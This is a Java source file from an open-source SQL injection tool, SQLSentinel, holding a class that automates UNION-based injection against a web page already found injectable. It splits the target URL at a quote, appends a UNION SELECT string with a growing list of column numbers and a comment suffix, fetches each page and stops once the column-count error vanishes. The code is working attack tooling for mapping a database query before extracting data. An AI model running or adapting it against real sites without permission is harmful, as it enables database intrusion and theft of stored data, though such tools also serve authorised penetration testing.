/*

 SQLSentinel v 0.3

 Copyright (C) 2012-2013  Luca Magistrelli <blackstorm010[at]gmail[dot]com>

 This program is free software; you can redistribute it and/or
 modify it under the terms of the GNU General Public License
 as published by the Free Software Foundation; either version 2
 of the License, or (at your option) any later version.

 This program is distributed in the hope that it will be useful,
 but WITHOUT ANY WARRANTY; without even the implied warranty of
 MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 GNU General Public License for more details.

 You should have received a copy of the GNU General Public License
 along with this program; if not, write to the Free Software
 Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

 */
package sqlsentinel.sqlchecker;

import java.io.IOException;
import java.util.logging.Level;
import java.util.logging.Logger;
import sqlsentinel.core.SQLSentinelUtils;


public class UnionNumberTester {
    private int numCols = 1;
    private String url_vuln = null;
    private String url_before = null;
    private String url_after = null;
    private SQLSentinelUtils sqlutils = new SQLSentinelUtils();
    private String url_vuln_union = null;
    private String url_vuln_union_part = null;
    private String page = null;
    private boolean check = false;
    private String numberColumnsMessage = null;
    private String unionCodeInj = null;
    
    public UnionNumberTester(String url_vuln, String unionCodeInj, String numberColumnsMessage){
        this.url_vuln = url_vuln;
        this.numberColumnsMessage = numberColumnsMessage;
        this.unionCodeInj = unionCodeInj;
    }
    
    public boolean checkNumericUnionInj(){
        int i = url_vuln.indexOf("'");
         if(i > -1){
             url_before = url_vuln.substring(0, i);
             url_after = url_vuln.substring(i + 1, url_vuln.length());
             url_vuln_union_part = url_before + unionCodeInj;
             do
             {
                 try {
                     page = url_vuln_union = null;
                     url_vuln_union = makeUnionUrl()  + "--+" + url_after;
                     page = sqlutils.getDownloadPage(url_vuln_union);
                     check = checkColumnsError(page);
                 } catch (IOException ex) {
                     Logger.getLogger(UnionNumberTester.class.getName()).log(Level.SEVERE, null, ex);
                 }                 
             }while(check == false && numCols <= 33);
             return check;
         }
         return false;
    }
    
       
    /*
     *  Check if page contains the sql error
     * 
     *  @param page String content of the page
     */
    private boolean checkColumnsError(String page){
        if(page.indexOf(numberColumnsMessage) > -1)
            return false;
        return true;
    }
    
    /*
     *  Function that build the union select query injection
     *  It adds one columns number everytime is called by the CheckVuln method
     */
    private String makeUnionUrl(){  
        if(numCols == 1)
            url_vuln_union_part = url_vuln_union_part + "1";
        else
                url_vuln_union_part += "," + numCols;
        numCols++;
        return url_vuln_union_part;
    }
    
    public String getNumericUnionSQLInjUrl() {
        return this.url_vuln_union;
    }
    
}
